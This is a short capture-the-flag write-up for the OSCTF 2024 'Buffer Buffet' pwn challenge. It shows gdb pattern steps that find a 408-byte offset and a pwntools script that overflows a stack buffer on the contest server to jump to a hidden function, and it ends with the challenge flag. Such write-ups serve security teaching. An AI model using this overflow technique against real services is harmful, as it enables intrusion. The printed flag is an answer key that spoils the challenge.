# Buffer Buffet
Solved by **zachwong_02**

Full writeup https://zach-wong.gitbook.io/easy-reads/osctf-2024-writeups/buffer-buffet-pwn

## Question
As an elite hacker invited to an exclusive digital banquet, you must navigate through the layers of a complex software system. Among the appetizers, main course, and dessert lies a hidden entry point that, when discovered, reveals a treasure trove of sensitive information.

## Solution
through `gdb-gef`
```
pattern create 500
pattern search baaaaaac
offset = 408
info functions: find the address of the secretFunction
```

```
from pwn import *

# Set up the connection
# context.log_level = 'debug'  # Set debug level to see communication
r = remote('34.125.199.248', 4056)  # Replace with your target IP and port

# binary = context.binary = ELF('./vuln')
# r = process(binary.path)

buffer = "A" * 408 

# Example interaction
r.recvuntil('Enter some text:')
r.sendline(buffer.encode()+ p64(0x00000000004011d6))

response = r.recvline()
response = r.recvline()
response = r.recvline()
response = r.recvline()
print("Response from server:", response.decode())

# Close the connection
r.close()
```
References:
* https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
* https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing
### Flag
`OSCTF{buff3r_buff3t_w4s_e4sy!}`
